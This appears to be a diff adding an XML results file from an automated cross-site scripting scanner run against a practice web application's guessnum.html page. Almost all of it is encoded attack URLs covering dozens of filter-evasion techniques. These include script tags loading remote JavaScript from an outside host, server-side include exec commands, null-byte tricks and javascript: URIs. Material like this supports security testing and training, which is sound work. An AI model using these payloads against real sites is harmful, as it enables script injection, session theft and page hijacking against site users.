+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E&admin=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>PHP</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E&admin=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Case Insensitive</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E&admin=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>HTML Entities</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E&admin=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Grave Accents</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E&admin=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Image w/CharCode</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E&admin=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Escaping JavaScript escapes</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F&admin=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>End title tag</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E&admin=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>STYLE w/broken up JavaScript</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22XSS%22%29%27%3B%3C%2FSTYLE%3E&admin=%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22XSS%22%29%27%3B%3C%2FSTYLE%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Embedded Tab</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E&admin=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Embedded Encoded Tab</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&admin=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Embedded Newline</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&admin=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Embedded Carriage Return</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&admin=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Multiline w/Carriage Returns</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E&admin=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Null Chars 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=perl+-e+%27print+%22%3CIMG+SRC%3Djava%00script%3Aalert%28%22XSS%22%29%3E%22%3B%27%3E+out&admin=perl+-e+%27print+%22%3CIMG+SRC%3Djava%00script%3Aalert%28%22XSS%22%29%3E%22%3B%27%3E+out&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Null Chars 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=perl+-e+%27print+%22%26%3CSCR%00IPT%3Ealert%28%22XSS%22%29%3C%2FSCR%00IPT%3E%22%3B%27+%3E+out&admin=perl+-e+%27print+%22%26%3CSCR%00IPT%3Ealert%28%22XSS%22%29%3C%2FSCR%00IPT%3E%22%3B%27+%3E+out&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Spaces/Meta Chars</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E&admin=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Non-Alpha/Non-Digit</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&admin=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>No Closing Script Tag</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js&admin=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Protocol resolution in script tags</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E&admin=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Half-Open HTML/JavaScript</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22&admin=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Double open angle brackets</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C&admin=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Extraneous Open Brackets</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E&admin=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Malformed IMG Tags</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E&admin=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>No Quotes/Semicolons</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT%3Ea%3D%2FXSS%2F+alert%28a.source%29%3C%2FSCRIPT%3E&admin=%3CSCRIPT%3Ea%3D%2FXSS%2F+alert%28a.source%29%3C%2FSCRIPT%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Event Handlers List 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=See+Below&admin=See+Below&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Event Handlers List 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=See+Below&admin=See+Below&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Event Handlers List 3</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=See+Below&admin=See+Below&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Evade Regex Filter 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&admin=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Evade Regex Filter 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+%3D%22blah%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&admin=%3CSCRIPT+%3D%22blah%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Evade Regex Filter 3</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+a%3D%22blah%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&admin=%3CSCRIPT+a%3D%22blah%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Evade Regex Filter 4</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&admin=%3CSCRIPT+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Evade Regex Filter 5</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&admin=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Filter Evasion 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&admin=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Filter Evasion 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+a%3D%22%3E%27%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&admin=%3CSCRIPT+a%3D%22%3E%27%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>IP Encoding</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E&admin=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Protocol Resolution Bypass</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E&admin=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Firefox Lookups 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E&admin=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Firefox Lookups 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22http%3A%2F%2Fha.ckers.org%40google%22%3EXSS%3C%2FA%3E&admin=%3CA+HREF%3D%22http%3A%2F%2Fha.ckers.org%40google%22%3EXSS%3C%2FA%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Firefox Lookups 3</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E&admin=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Removing Cnames</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22http%3A%2F%2Fgoogle.com%2F%22%3EXSS%3C%2FA%3E&admin=%3CA+HREF%3D%22http%3A%2F%2Fgoogle.com%2F%22%3EXSS%3C%2FA%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Extra dot for Absolute DNS</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22http%3A%2F%2Fwww.google.com.%2F%22%3EXSS%3C%2FA%3E&admin=%3CA+HREF%3D%22http%3A%2F%2Fwww.google.com.%2F%22%3EXSS%3C%2FA%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>JavaScript Link Location</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E&admin=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Content Replace</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22http%3A%2F%2Fwww.gohttp%3A%2F%2Fwww.google.com%2Fogle.com%2F%22%3EXSS%3C%2FA%3E&admin=%3CA+HREF%3D%22http%3A%2F%2Fwww.gohttp%3A%2F%2Fwww.google.com%2Fogle.com%2F%22%3EXSS%3C%2FA%3E&</result>
+</xss>
+
+</xssAttacks>
